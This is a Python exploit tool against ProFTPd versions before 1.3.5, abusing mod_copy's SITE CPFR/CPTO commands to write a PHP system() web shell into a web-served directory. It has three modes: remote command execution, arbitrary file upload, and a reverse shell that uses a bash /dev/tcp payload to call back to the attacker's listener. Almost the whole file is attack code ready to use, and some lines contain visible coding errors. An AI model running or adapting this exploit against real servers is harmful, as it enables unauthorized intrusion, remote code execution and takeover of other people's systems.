#!/usr/bin/python3
import socket
import requests
import argparse
import sys


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    end = '\033[m'


class ProFTPdExploit(object):
    #   Vulnerable Server:  { target  ip address }
    #   Directory:  { path accessible from web (the mod_copy directory) }
    #   Command:  { remote command to execute }
    #   port_containing_ftp:  { FTP port }
    #   file_containing_php_code:  { php code to execute }
    #   http_or_https:  { http service or https service }
    #   local_host:  { local host (ip address) of YOUR machine }
    #   local_port:  {local port (port number) oof YOUR machine }
    def __init__(self, vulnerable_server, directory, command, port_containing_ftp, file_containing_php_code,
                 http_or_https, local_host, local_port):
        self.vulnerable_server = vulnerable_server
        self.directory = directory
        self.command = command
        self.local_host = local_host
        self.local_port = local_port
        self.file_containing_php_code = file_containing_php_code
        self.port_containing_ftp = port_containing_ftp
        self.http_or_https = http_or_https

    def invoke_remote_command_execution(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        evil = '<?php system("' + self.command + '"); ?>'
        sock.connect((self.vulnerable_server, int(self.port_containing_ftp)))
        connection_data = sock.recv(1024)
        sock.send(b"site cpfr /etc/passwd")
        sending_data_number_1 = sock.recv(1024)
        sock.send(b"site cpto " + bytes(evil))
        sending_data_number_2 = sock.recv(1024)
        sock.send(b"site cpfr /proc/self/fd/3")
        sending_data_number_3 = sock.recv(1024)
        sock.send(b"site cpto " + bytes(self.directory) + b"infogen.php")
        sending_data_number_4 = sock.recv(1024)
        print(f"""
{
        f"{Colors.purple}DATA RECEIVED #1: {Colors.end}" + connection_data.decode(),
        f"{Colors.purple}DATA RECEIVED #2: {Colors.end}" + sending_data_number_1.decode(),
        f"{Colors.purple}DATA RECEIVED #3: {Colors.end}" + sending_data_number_2.decode(),
        f"{Colors.purple}DATA RECEIVED #4: {Colors.end}" + sending_data_number_3.decode(),
        f"{Colors.purple}DATA RECEIVED #5: {Colors.end}" + sending_data_number_4.decode()
        }""")
        sock.close()
        response = requests.get(f"{self.http_or_https}://" + self.vulnerable_server + "/infogen.php")
        if response.status_code == 200:
            print(
                f"[{Colors.green}+{Colors.end}] {response.status_code}: Executed Successfully\n\n{response.text}")
        else:
            exit(f"{Colors.red}CODE{Colors.end}:  {response.status_code}")

    def remote_file_upload(self):
        file_format = input(
            f"{Colors.red}(ProFTPd <1.3.5 mod_copy Invoke Remote File Upload){Colors.end} [Enter File Format (ex: .php, .py)]:~#")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        file = open(self.file_containing_php_code, "rb")
        evil = bytes(f"echo '{file.read()}' > ppxyz{file_format}")
        sock.connect((self.vulnerable_server, int(self.port_containing_ftp)))
        connection_data = sock.recv(1024)
        sock.send(b"site cpfr /etc/passwd")
        sending_data_number_1 = sock.recv(1024)
        sock.send(b"site cpto " + evil)
        sending_data_number_2 = sock.recv(1024)
        sock.send(b"site cpfr /proc/self/fd/3")
        sending_data_number_3 = sock.recv(1024)
        sock.send(b"site cpto " + bytes(self.directory) + b"infogen.php")
        sending_data_number_4 = sock.recv(1024)
        print(f"""
{
        f"{Colors.purple}DATA RECEIVED #1: {Colors.end}" + connection_data.decode(),
        f"{Colors.purple}DATA RECEIVED #2: {Colors.end}" + sending_data_number_1.decode(),
        f"{Colors.purple}DATA RECEIVED #3: {Colors.end}" + sending_data_number_2.decode(),
        f"{Colors.purple}DATA RECEIVED #4: {Colors.end}" + sending_data_number_3.decode(),
        f"{Colors.purple}DATA RECEIVED #5: {Colors.end}" + sending_data_number_4.decode()
        }""")
        sock.close()
        response = requests.get(f"{self.http_or_https}://" + self.vulnerable_server + "/infogen.php")
        if response.status_code == 200:
            print(
                f"[{Colors.green}+{Colors.end}] {response.status_code}: File Was Uploaded Successfully\n\n{response.text}")
        else:
            exit(f"{Colors.red}CODE{Colors.end}:  {response.status_code}")

    def reverse_shell(self):
        # INVOKE THE PAYLOAD { SENDS TO SERVER }
        payload = f"bash -c 'sh -i >& /dev/tcp/{self.local_host}/{self.local_port} 0>&1'"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        evil = '<?php system("' + payload + '"); ?>'
        sock.connect((self.vulnerable_server, int(self.port_containing_ftp)))
        print(sock.recv(1024).decode())
        sock.send(b"site cpfr /etc/passwd")
        print(sock.recv(1024).decode())
        sock.send(b"site cpto " + bytes(evil))
        print(sock.recv(1024).decode())
        sock.send(b"site cpfr /proc/self/fd/3")
        print(sock.recv(1024).decode())
        sock.send(b"site cpto " + bytes(self.directory) + b"infogen.php")
        print(sock.recv(1024).decode())

        # THE FOLLOWING CODE IS THE SHELL { BIND SHELL AS FOLLOWED }
        servers = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        servers.bind((self.local_host, int(self.local_port)))
        servers.listen(1)
        conn, address = servers.accept()
        conn.settimeout(1)

        prompt = conn.recv(128)
        prompt = str(prompt.decode("utf-8")).strip()
        command = input(prompt)

        while True:
            try:
                c = "%s\n" % command
                if len(c) > 0:
                    conn.sendall(c.encode("utf-8"))
                    if command == 'exit':
                        conn.close()
                        break
                    else:
                        complete_answer = ""
                        while True:
                            (answer) = None
                            try:
                                answer = str((conn.recv(1024)).decode("utf-8"))
                                complete_answer += answer
                            except socket.timeout:
                                sock.close()
                                complete_answer.strip()
                                break
                            print(complete_answer, end='')
                command = input(f"{Colors.red}(EXPLOITED MACHINE){Colors.end} [~_reverse~shell_~]:~#")
            except (KeyboardInterrupt, EOFError):
                break


# COMMAND LINE GIVEN ARGUMENTS
parser = argparse.ArgumentParser(
                                 usage=f"python3 {sys.argv[0]}\n\nOPTIONS:\n   Invoke Remote Command Execution\n   Invoke Remote File Upload\n   Invoke Reverse Shell",
                                 description="ProFTPd <1.3.5 Exploits Made By: Fancy")
parser.add_argument("-s", type=str, metavar="server".lower(), required=True,
                    help="vulnerable server address")
parser.add_argument("-p", type=int, metavar="ftp-port".lower(), required=True,
                    help="port number containing the ftp service")
parser.add_argument("-c", type=str, metavar="command".lower(), required=False,
                    help="command to execute (choose this if your want remote command execution)")
parser.add_argument("-f", metavar="payload-file.php".lower(), required=False,
                    help="file containing the php code you wish to execute (choose this if you want remote code execution)")
parser.add_argument("-option", required=False,
                    help="choose if its http or https service running")
parser.add_argument("-d", metavar="dir".lower(), required=False, type=str,
                    help="directory to the mod_copy")
parser.add_argument("-lh", metavar="lhost".lower(), required=False, type=str,
                    help="local host for bind shell")
parser.add_argument("-lp", metavar="lport".lower(), required=False, type=int,
                    help="local port for bind shell")
parser.add_argument("-rs", required=False, action="store_true", default=False,
                    help="choose this for reverse shell")

arg = parser.parse_args()

attack = ProFTPdExploit(vulnerable_server=arg.s, port_containing_ftp=arg.p,
                        command=arg.c, file_containing_php_code=arg.f, directory=arg.d,
                        http_or_https=arg.option, local_host=arg.lh, local_port=arg.lp)


# MAIN FUNCTION
def main():
    if arg.c:
        attack.invoke_remote_command_execution()
    elif arg.f:
        attack.remote_file_upload()
    elif arg.rs:
        attack.reverse_shell()
    else:
        exit()


# CALL
if __name__ == "__main__":
    main()
